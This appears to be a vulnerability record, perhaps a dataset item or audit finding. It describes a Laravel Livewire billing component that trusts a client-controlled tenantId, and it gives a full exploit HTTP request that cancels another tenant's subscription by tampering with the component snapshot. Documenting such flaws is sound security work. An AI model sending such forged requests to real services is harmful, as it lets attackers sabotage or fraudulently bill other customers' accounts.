diagnosis: The subscription management Livewire component updates multi-tenant billing tiers using an unsanitized public property $tenantId. A malicious user can alter the tenantId parameter in the component request to downgrade or cancel competitor accounts or subscribe unauthorized tenants to premium plans billed to third parties.
exploit_request:
POST /livewire/update HTTP/1.1
Host: billing.saasplatform.com
Authorization: Bearer 33|tenantadmin99
Content-Type: application/json

{"components": [{"snapshot": "{\"data\":{\"tenantId\":883,\"newPlanTier\":\"canceled\"}}", "updates": {}, "calls": [{"method": "changeTier", "params": []}]}]}
